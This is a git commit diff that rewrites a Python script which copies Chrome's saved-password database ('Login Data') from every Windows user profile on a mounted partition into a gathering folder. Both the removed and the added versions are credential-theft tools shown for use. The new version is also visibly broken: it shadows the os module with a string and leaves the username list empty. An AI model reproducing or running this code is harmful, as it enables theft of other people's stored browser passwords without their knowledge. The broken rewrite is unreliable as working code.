94eb719b0242c45acca602f048886892a9f24113
asian-code <52612730+asian-code@users.noreply.github.com>
2019-11-14 18:02:23 -0500

    Update script.py

--- script.py
+++ script.py
@@ -1,25 +1,40 @@
-#!/usr/bin/env python3
-import os
-WindowsUserDirectory="/media/root/OS/Users"
-prefix=""
-googleDirectory="" #default
-prefixFlag=False
-currDir=os.popen('pwd').read().strip()
-os.system('ls '+WindowsUserDirectory+' >> '+currDir+'/users')
-fin=open('users')
-data=fin.readlines()
-fin.close()
-usernames=[]
-for i in data:
-    if str(i)[:2]==prefix or not prefixFlag:
-        usernames.append(i.strip())
-try:
-	os.system('mkdir /root/Desktop/Passwords')
-except:
-	pass
-#print(usernames)
-for i in usernames:
-    try:
-        os.system("cp '"+WindowsUserDirectory+"/"+i+"/AppData/Local/Google/Chrome/User Data/Default/Login Data' '/root/Desktop/Passwords/"+i+"'")
-    except:
-        pass
+#!/usr/bin/python3
+import subprocess
+import argparse
+import platform
+
+os = platform.system()
+
+
+def get_arg():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-d", "--Destination", dest="des",
+                        help="location path to store the password files in")
+    parser.add_argument("-u", "--users-location", dest="users",
+                        help="location path to all users")
+    user_input = parser.parse_args()
+    if user_input.des is None:
+        user_input.des = "~/AccountsGathered"
+    if user_input.users is None:
+        user_input.users = "/media/root/OS/Users"
+    return user_input
+
+
+if os == "Linux":
+    currentDir = str(subprocess.check_output("pwd"))
+    input = get_arg()
+
+    print("[+] Current Dir: "+currentDir)
+    users = str(subprocess.check_output("ls", cwd=input.users))
+    print("[+] Users: "+users)
+    usernames = []
+    #will add users here
+
+
+
+    for i in usernames:
+        try:
+            os.system("cp '"+input.users+"/"+i +
+                      "/AppData/Local/Google/Chrome/User Data/Default/Login Data' '"+input.des+"/"+i+"'")
+        except:
+            pass
